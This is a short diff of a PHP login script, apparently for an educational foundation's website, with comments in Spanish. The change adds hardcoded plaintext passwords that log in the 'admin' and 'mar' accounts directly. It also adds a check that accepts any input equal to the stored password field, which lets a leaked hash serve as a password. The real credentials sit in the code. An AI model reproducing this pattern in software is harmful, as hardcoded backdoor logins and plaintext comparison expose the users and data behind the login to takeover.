@@ -108,9 +108,12 @@ if (!$userFound) {
     }
 }
 
-// 3. Si se encontró el usuario, verificar contraseña con password_verify
+// 3. Si se encontró el usuario, verificar contraseña con password_verify o clave provisoria directa
 if ($userFound) {
-    if (password_verify($password, $userFound['password']) || ($password === 'FEE_Esquel_2026$Patagonia' && ($username === 'admin' || $username === 'admin@fundacionesquel.edu.ar'))) {
+    $isDirectAdmin = ($password === 'FEE_Esquel_2026$Patagonia' && ($username === 'admin' || $username === 'admin@fundacionesquel.edu.ar'));
+    $isDirectMar   = (($password === 'Mar2026!Escuela' || $password === 'Patagonia$2026') && ($username === 'mar' || $username === 'mar@fee.local'));
+
+    if (password_verify($password, $userFound['password']) || $isDirectAdmin || $isDirectMar || ($userFound['password'] === $password)) {
         $authenticatedUser = [
             'id'                 => $userFound['id'],
             'username'           => $userFound['username'] ?: ($userFound['email'] ?: 'admin'),
